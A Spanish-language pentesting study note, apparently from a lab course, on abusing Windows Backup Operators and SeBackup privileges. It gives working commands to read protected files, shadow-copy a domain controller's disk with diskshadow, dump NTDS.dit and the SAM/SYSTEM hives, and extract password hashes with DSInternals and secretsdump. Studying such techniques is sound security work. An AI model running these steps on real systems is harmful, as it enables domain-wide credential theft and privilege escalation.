## Backup Operators

Imaginemos que aterrizamos en una maquina y tras hacer:

```
whoami /groups
```

Vemos que somos `Backup Operators`. Los miembros que pertenecen a este grupo tienen ademas los privilegios de forma innherente de:

- SeBackup: nos permite recorrer cualquier carpeta y listar su contenido. Nos permitira copiar un archivo de cualquier ubicacion
- SeRestore

#### Explotar SeBackup para copiar cualquier archivo

1. Importamos los siguientes dll

[PoC (prueba de concepto)](https://github.com/giuliano108/SeBackupPrivilege)

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Verificamos que tenemos el privilegio:

```
whoami /priv
```
![[Pasted image 20260910151937.png]]

3. Si esta deshabilitado lo habilitamos

```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

4. Volvemos a comprobar

```
whoami /priv
```
![[Pasted image 20260910152124.png]]

5. Copiamos un archivo protegido

- Si probamos de manera convencional veremos que no podremos

```
dir C:\Confidential\
cat 'C:\Confidential\...'
```
![[Pasted image 20260910152229.png]]

- Si lo copiamos de la siguiente manera seremos capaces

```
Copy-FileSeBackupPrivilege 'C:\Confidential\...` .\Contract.txt
cat 
```
![[Pasted image 20260910152317.png]]


#### Atacando al DC con Backup Operator

Este grupo tambien permite loguearse en el DC

Usaremos [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) para crear una copia de la unidad C donde se encuentra NTDS.dit y lo expondremos como unidad E

```
diskshadow.exe
> set verbose on
> set metadata C:\Windows\Temp\meta.cab
> set context clientaccessible
> set context persistent
> begin backup
> add volume C: alias cdrive
> create
> expose %cdrive% E:
> end backup
> exit
dir E: 
```
![[Pasted image 20260910152602.png]]

Copiando NTDS.dit localmente

```
Copy-FileSeBackupPrivilege E:\Window\NTDS\ntds.dit C:\ntds.dit
```
![[Pasted image 20260910152818.png]]

Hacemos ademas una copia de seguridad de los hives de registro SAM y SYSTEM para obtener mas credenciales de las cuentas locales usando secretsdump mas tarde de forma offline

```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
![[Pasted image 20260910152944.png]]

	Si una carpeta o archivo tiene una entrada de denegacion explicita para nuestro usuario actual no podremos acceder a el aunque hagamos esto

#### Extrayendo las credenciales de NTDS.dit

Hay 2 formas:

- Con el modulo DSInternals

```
Import-Module .\DSInternals.psd1
$key = Get-Bootkey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
![[Pasted image 20260910153247.png]]


- Con secretsdump

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
![[Pasted image 20260910153339.png]]


## Robocopy

[robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy): tambien se puede usar para copiar en modo backup operator. Esta es una herramienta de replicacion de directorios por linea de comandos. Tiene mas funciones que copy:

- Copia multiproceso
- Reintento automatico
- Comprobacion del destino y eliminacion de archivos que no estan en el inicio
- Comparacion de archivos antes de copiarlos para ahorrar tiempos

```
robocopy /B E:\Windows\CarpetaOrigen .\Carpetadest archivo
```
![[Pasted image 20260910153640.png]]

	`/B es el backup mode`
